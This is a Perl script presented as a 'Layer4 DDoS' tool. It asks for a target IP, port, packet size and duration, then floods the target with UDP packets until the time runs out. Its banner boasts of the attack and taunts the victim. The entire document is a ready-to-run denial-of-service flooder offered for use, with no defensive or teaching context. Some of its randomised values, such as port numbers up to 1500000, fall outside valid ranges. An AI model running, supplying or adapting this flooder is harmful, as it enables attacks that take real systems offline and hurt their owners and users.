#!/usr/bin/perl
use strict;
use warnings;
use Socket;

print "[IP]: ";
my $ip = <STDIN>;
chomp($ip);

print "[Port]: ";
my $port = <STDIN>;
chomp($port);

print "[Packets]: ";
my $size = <STDIN>;
chomp($size);

print "[Seconds]: ";
my $time = <STDIN>;
chomp($time);

my ($iaddr, $endtime, $psize, $pport);

$iaddr = inet_aton($ip) or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time || 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;
DDoS GOD By OverKill, Attacking $ip with $size packets.
OverKill Layer4 DDoS script.
EOTEXT

print "Kill $ip port " . ($port || "random") . " with " . ($size ? "$size byte" : "Get Null Routed Bitch!?") . "\n";
print "~ Time: " . ($time ? "$time seconds" : "") . "\n";

for (; time() <= $endtime;) {
    $psize = $size ? $size : int(rand(1500000 - 64) + 64);
    $pport = $port ? $port : int(rand(1500000)) + 1;

    send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
}
